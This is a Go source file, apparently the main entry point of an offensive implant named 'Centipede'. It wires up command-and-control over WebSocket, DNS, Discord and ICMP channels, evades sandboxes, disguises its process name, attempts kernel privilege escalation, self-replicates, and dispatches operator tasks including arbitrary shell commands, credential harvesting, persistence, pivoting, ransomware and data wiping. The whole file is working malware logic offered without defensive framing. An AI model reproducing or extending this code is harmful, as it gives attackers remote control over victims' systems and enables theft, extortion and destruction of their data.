package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/saviorSEC/Centipede/internal/c2"
	"github.com/saviorSEC/Centipede/internal/common"
	"github.com/saviorSEC/Centipede/internal/exploiter"
	"github.com/saviorSEC/Centipede/internal/payloads"
	"github.com/saviorSEC/Centipede/internal/replicator"
	"github.com/saviorSEC/Centipede/internal/scanner"
	"github.com/saviorSEC/Centipede/internal/sensor"
)

type Config struct {
	C2Endpoint     string `json:"c2_endpoint"`
	C2Key          string `json:"c2_key"`
	C2Secret       string `json:"c2_secret"`
	C2DNSDomain    string `json:"c2_dns_domain"`
	C2DiscordToken string `json:"c2_discord_token"`
	C2DiscordChan  string `json:"c2_discord_channel"`
	C2ICMPTarget   string `json:"c2_icmp_target"`
	ScanInterval   int    `json:"scan_interval"`
	SpreadInterval int    `json:"spread_interval"`
	Exploit        bool   `json:"exploit"`
	Replication    bool   `json:"replication"`
	Masquerade     bool   `json:"masquerade"`
}

func defaultConfig() *Config {
	return &Config{
		ScanInterval:   300,
		SpreadInterval: 300,
		Exploit:        true,
		Replication:    true,
		Masquerade:     true,
	}
}

func main() {
	configPath := flag.String("config", "/etc/centipede.conf", "Config file path")
	c2Endpoint := flag.String("c2", "", "C2 WebSocket endpoint")
	c2Key := flag.String("c2-key", "", "c2d static public key (hex) for the encrypted channel")
	c2Secret := flag.String("c2-secret", "", "operator fleet secret (hex) for implant auth")
	c2DNS := flag.String("c2-dns", "", "C2 DNS domain for tunnel")
	c2DiscordTok := flag.String("c2-discord-token", "", "Discord bot token")
	c2DiscordChan := flag.String("c2-discord-channel", "", "Discord channel ID")
	c2ICMP := flag.String("c2-icmp", "", "C2 ICMP tunnel target")
	noExploit := flag.Bool("no-exploit", false, "Disable exploit attempts")
	noSpread := flag.Bool("no-spread", false, "Disable self-replication")
	debug := flag.Bool("debug", false, "Enable debug output")
	version := flag.Bool("version", false, "Show version")
	flag.Parse()

	if *version {
		fmt.Printf("centipede v0.1.0\n")
		return
	}

	if *debug {
		log.SetFlags(log.LstdFlags | log.Lshortfile)
	} else {
		log.SetOutput(os.NewFile(0, os.DevNull))
	}

	rand.Seed(time.Now().UnixNano())

	botID := fmt.Sprintf("%s-%s-%d",
		strings.ReplaceAll(common.GetHostname(), ".", "-"),
		common.RandomString(8), os.Getpid())

	// Check sandbox
	if isSandboxed() {
		if *debug {
			log.Printf("[centipede] sandbox detected, sleeping")
		}
		time.Sleep(30 * time.Minute)
	}

	// Load config
	cfg := defaultConfig()
	if data, err := os.ReadFile(*configPath); err == nil {
		json.Unmarshal(data, cfg)
	}
	if *c2Endpoint != "" {
		cfg.C2Endpoint = *c2Endpoint
	}
	if *c2Key != "" {
		cfg.C2Key = *c2Key
	}
	if *c2Secret != "" {
		cfg.C2Secret = *c2Secret
	}
	if *c2DNS != "" {
		cfg.C2DNSDomain = *c2DNS
	}
	if *c2DiscordTok != "" {
		cfg.C2DiscordToken = *c2DiscordTok
	}
	if *c2DiscordChan != "" {
		cfg.C2DiscordChan = *c2DiscordChan
	}
	if *c2ICMP != "" {
		cfg.C2ICMPTarget = *c2ICMP
	}
	if *noExploit {
		cfg.Exploit = false
	}
	if *noSpread {
		cfg.Replication = false
	}

	// Masquerade
	if cfg.Masquerade {
		os.Args[0] = common.RandomExeName()
	}

	// Post-LPE hygiene: when this instance was elevated through a setuid
	// re-exec, clear the setuid bit on the implant file once running as
	// root so no local account can re-trigger elevation.
	if os.Geteuid() == 0 && os.Getenv("CENTIPEDE_ELEV_SELF") == "1" {
		go func() {
			time.Sleep(3 * time.Second)
			if exe, err := os.Readlink("/proc/self/exe"); err == nil {
				if err := os.Chmod(exe, 0o755); err != nil {
					log.Printf("[centipede] chmod self: %v", err)
				}
			}
		}()
	}

	// Environment sensor
	env := sensor.Gather()

	// Start C2
	c2Client := c2.NewC2Client(
		botID, cfg.C2Endpoint, cfg.C2DNSDomain,
		cfg.C2DiscordToken, cfg.C2DiscordChan, cfg.C2ICMPTarget,
	)
	if cfg.C2Key != "" {
		if err := c2Client.SetServerKey(cfg.C2Key); err != nil {
			log.Printf("[centipede] c2-key invalid: %v", err)
		} else if cfg.C2Secret != "" {
			_ = c2Client.SetAuthSecret(cfg.C2Secret)
		}
	}
	if cfg.C2Endpoint != "" || cfg.C2DNSDomain != "" || cfg.C2DiscordToken != "" {
		c2Client.Start()
		defer c2Client.Stop()
	}

	// Start scanner
	scan := scanner.NewScanner()
	scan.Start()
	defer scan.Stop()

	// Start replicator
	var rep *replicator.Replicator
	if cfg.Replication {
		rep = replicator.New()
		rep.Start()
		defer rep.Stop()
	} else {
		rep = replicator.New() // staged for directed spread even when autonomous
	}

	// Attempt LPE
	if cfg.Exploit && os.Geteuid() != 0 {
		go doExploit(env)
	}

	// Task processing loop
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		processTasks(c2Client, rep)
	}()

	// Wait for signal
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
}

func doExploit(env *sensor.EnvInfo) {
	exp := exploiter.New()
	ki := exp.DetectKernel()
	if ki == nil {
		return
	}
	log.Printf("[centipede] attempting LPE (kernel %s)", ki.Release)
	results := exp.Find(ki)
	for _, r := range results {
		if r.Success && r.Root {
			log.Printf("[centipede] root via %s", r.Name)
			exe, _ := os.Readlink("/proc/self/exe")
			if exe != "" {
				// Page-cache class exploits provision the implant binary
				// setuid-root (ElevPath) so the re-exec lands with euid 0.
				if r.ElevPath != "" {
					exe = r.ElevPath
				}
				envv := append(os.Environ(), "CENTIPEDE_ELEV_SELF=1")
				syscall.Exec(exe, os.Args, envv)
			}
			break
		}
	}
}

func processTasks(c *c2.C2Client, rep *replicator.Replicator) {
	for task := range c.Tasks() {
		go func(t c2.Task) {
			args := parseTaskArgs(t.Args)

			var output string
			var err error

			switch t.Action {
			case "exec", "shell":
				output, err = runShell(args)
			case "payload":
				name := args["name"]
				if name != "" {
					output, err = payloads.Run(name, args)
				}
			case "enum":
				output, err = payloads.Run("enum", args)
			case "harvest":
				output, err = payloads.Run("harvest", args)
			case "persist":
				output, err = payloads.Run("persist", args)
			case "pivot":
				output, err = payloads.Run("pivot", args)
			case "ransomware":
				output, err = payloads.Run("ransomware", args)
			case "ransomware_decrypt":
				output, err = payloads.Run("ransomware_decrypt", args)
			case "wipe":
				output, err = payloads.Run("wipe", args)
			case "selfdestruct":
				payloads.Run("selfdestruct", args)
				return
			case "sleep":
				dur, parseErr := time.ParseDuration(args["duration"])
				if parseErr == nil && dur > 0 {
					time.Sleep(dur)
				}
				output = "slept"
			case "spread":
				// operator-directed propagation: args target/vector/user/pass
				if rep == nil {
					output, err = "", fmt.Errorf("replication unavailable")
				} else {
					output, err = rep.DirectedSpread(args["target"], args["vector"], args["user"], args["pass"])
				}
			default:
				// Any registered payload name can be dispatched directly as a
				// task action; falls back to a shell command for free-form
				// actions.
				if _, ok := payloads.Get(t.Action); ok {
					output, err = payloads.Run(t.Action, args)
				} else {
					output, err = runShell(map[string]string{"cmd": t.Action})
				}
			}

			result := c2.TaskResult{
				TaskID:  t.ID,
				Success: err == nil,
				Output:  output,
			}
			if err != nil {
				result.Error = err.Error()
			}
			c.SendResult(result)
		}(task)
	}
}

// parseTaskArgs normalizes task arguments arriving over the wire.  The API
// and dashboard send args as a JSON-encoded string, so a frame can carry a
// bare command ("id"), a JSON object ({"cmd":"id"}), or a JSON object
// encoded inside a string ("{\"cmd\":\"id\"}").  All three forms resolve
// to the same map so exec-style tasks behave identically regardless of how
// the operator client encodes them.
func parseTaskArgs(raw json.RawMessage) map[string]string {
	args := map[string]string{}
	if len(raw) == 0 {
		return args
	}

	// Direct JSON object: {"cmd":"id", ...}
	if err := json.Unmarshal(raw, &args); err == nil && len(args) > 0 {
		return args
	}

	// String payload: "id" or "{\"cmd\":\"id\"}" (double-encoded object)
	var s string
	if err := json.Unmarshal(raw, &s); err == nil {
		if err := json.Unmarshal([]byte(s), &args); err == nil && len(args) > 0 {
			return args
		}
		args["cmd"] = s
		return args
	}

	// Unquoted fallback: treat the raw bytes as the command
	args["cmd"] = string(raw)
	return args
}

func runShell(args map[string]string) (string, error) {
	cmd := args["cmd"]
	if cmd == "" {
		cmd = args["command"]
	}
	if cmd == "" {
		return "", fmt.Errorf("no command specified")
	}

	shell := "/bin/sh"
	if args["shell"] != "" {
		shell = args["shell"]
	}

	out, err := exec.Command(shell, "-c", cmd).CombinedOutput()
	return string(out), err
}

func isSandboxed() bool {
	if os.Getenv("DETECTED") != "" {
		return true
	}
	if runtime.NumCPU() <= 1 {
		data, _ := os.ReadFile("/proc/cpuinfo")
		if len(data) < 500 {
			return true
		}
	}
	return false
}
